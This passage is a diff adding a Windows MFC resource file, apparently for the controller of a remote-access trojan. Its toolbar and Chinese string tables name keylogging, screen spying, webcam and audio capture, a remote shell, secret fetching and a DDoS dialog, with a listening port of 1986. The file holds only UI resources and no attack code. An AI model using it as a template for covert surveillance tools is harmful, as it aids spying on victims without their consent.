+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 321
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 248
+    END
+
+    IDD_SYSTEM, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 267
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 252
+    END
+
+    IDD_SHELL, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 432
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 263
+    END
+
+    IDD_AUDIO, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 222
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 79
+    END
+
+    IDD_DDOS, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 450
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 234
+    END
+
+    IDD_GENGXIN, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 180
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 144
+    END
+
+    IDD_GUANYU, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 452
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 226
+    END
+
+    IDD_DLG_PROGRESS, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 378
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 186
+    END
+
+    IDD_DLGSECRET_GET, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 259
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 204
+    END
+END
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Cursor
+//
+
+IDC_DRAG                CURSOR                  "res\\1.cur"
+IDC_MUTI_DRAG           CURSOR                  "res\\2.cur"
+IDC_CURSOR3             CURSOR                  "res\\3.cur"
+IDC_CURSOR4             CURSOR                  "res\\4.cur"
+IDC_DOT                 CURSOR                  "res\\dot.cur"
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Toolbar
+//
+
+IDR_TOOLBAR1 TOOLBAR  48, 48
+BEGIN
+    BUTTON      IDM_FILEMANAGER
+    SEPARATOR
+    BUTTON      IDM_SCREENSPY
+    SEPARATOR
+    BUTTON      IDM_KEYBOARD
+    SEPARATOR
+    BUTTON      IDM_REMOTESHELL
+    SEPARATOR
+    BUTTON      IDM_SYSTEM
+    SEPARATOR
+    BUTTON      IDM_WEBCAM
+    SEPARATOR
+    BUTTON      IDM_AUDIO_LISTEN
+    SEPARATOR
+    BUTTON      IDM_SRCRET_FETCH
+END
+
+IDR_TOOLBAR2 TOOLBAR  24, 24
+BEGIN
+    BUTTON      IDT_REMOTE_PREV
+    SEPARATOR
+    BUTTON      IDT_REMOTE_COPY
+    BUTTON      IDT_REMOTE_DELETE
+    BUTTON      IDT_REMOTE_NEWFOLDER
+    SEPARATOR
+    BUTTON      IDT_REMOTE_VIEW
+    BUTTON      IDT_REMOTE_STOP
+END
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Bitmap
+//
+
+IDR_TOOLBAR1            BITMAP                  "res\\toolbar1.bmp"
+IDB_TOOLBAR_ENABLE      BITMAP                  "res\\Bitmap_4.bmp"
+IDR_TOOLBAR2            BITMAP                  "res\\toolbar2.bmp"
+IDB_TOOLBAR_DISABLE     BITMAP                  "res\\Bitmap_5.bmp"
+IDB_SPLASH              BITMAP                  "res\\splish.bmp"
+IDB_TOOL_MONDIS         BITMAP                  "res\\TOOL_MONITOR_DIS.bmp"
+IDB_TOOL_MONEN          BITMAP                  "res\\TOOL_MONITOR_EN.bmp"
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// String Table
+//
+
+STRINGTABLE 
+BEGIN
+    ID_VIEW_STATUS_BAR      "显示或隐藏状态栏\n显隐状态栏"
+    ID_STAUTSTIP            "就绪"
+    ID_STAUTSSPEED          "S: 0.00 kb/s R: 0.00 kb/s"
+    ID_STAUTSPORT           "端口: 1986"
+    ID_STAUTSCOUNT          "连接: 0"
+END
+
+STRINGTABLE 
+BEGIN
+    IDM_FILEMANAGER         "\n文件查看"
+    ID_STAUTLINE            "\n行"
+    IDT_LOCAL_PREV          "\n返回上级目录"
+    IDT_LOCAL_COPY          "\n拷贝目录到另外的计算机"
+    IDT_LOCAL_DELETE        "\n删除文件或目录"
+    IDT_LOCAL_VIEW          "\n选择图标模式"
+END
+
+STRINGTABLE 
+BEGIN
+    IDT_LOCAL_NEWFOLDER     "\n新建文件"
+    IDT_LOCAL_STOP          "\n停止当前操作"
+END
+
+STRINGTABLE 
+BEGIN
+    IDM_SCREENSPY           "\n屏幕查看"
+    IDM_WEBCAM              "\n开启摄像头"
+    IDM_KEYBOARD            "\n键盘记录"
+    IDM_SYSTEM              "\n系统信息查看"
+    IDM_REMOTESHELL         "\nShell命令"
+END
+
+STRINGTABLE 
+BEGIN
+    IDM_AUDIO_LISTEN        "\n录音"
+END
+
+STRINGTABLE 
+BEGIN
+    IDM_SRCRET_FETCH        "\n密取"
+END
+
+#endif    // Chinese (P.R.C.) resources
+/////////////////////////////////////////////////////////////////////////////
+
+
+
+#ifndef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 3 resource.
+//
+#define _AFX_NO_SPLITTER_RESOURCES
+#define _AFX_NO_OLE_RESOURCES
+#define _AFX_NO_TRACKER_RESOURCES
+#define _AFX_NO_PROPERTY_RESOURCES
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)
+#ifdef _WIN32
+LANGUAGE 4, 2
+#pragma code_page(936)
+#endif //_WIN32
+#include "res\TSPClient.rc2"  // non-Microsoft Visual C++ edited resources
+#include "l.chs\afxres.rc"          // Standard components
+#endif
+
+/////////////////////////////////////////////////////////////////////////////
+#endif    // not APSTUDIO_INVOKED
+
